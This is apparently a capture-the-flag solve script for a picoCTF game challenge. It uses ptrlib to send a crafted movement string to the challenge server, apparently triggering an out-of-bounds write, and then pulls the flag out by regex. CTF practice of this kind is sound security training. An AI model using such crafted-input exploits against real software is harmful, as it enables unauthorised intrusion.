#!/usr/bin/env python
import ptrlib as ptr

# io = ptr.Process("./game")
io = ptr.Socket("saturn.picoctf.net", 57259)

payload = b"l\x70"
payload += b"a" * 4
payload += b"w" * 5
payload += b"a" * 39
payload += b"s"

io.sendline(payload)

flag = io.recvregex(r"picoCTF\{.+?\}").decode()
ptr.logger.info(f"flag = {flag}")
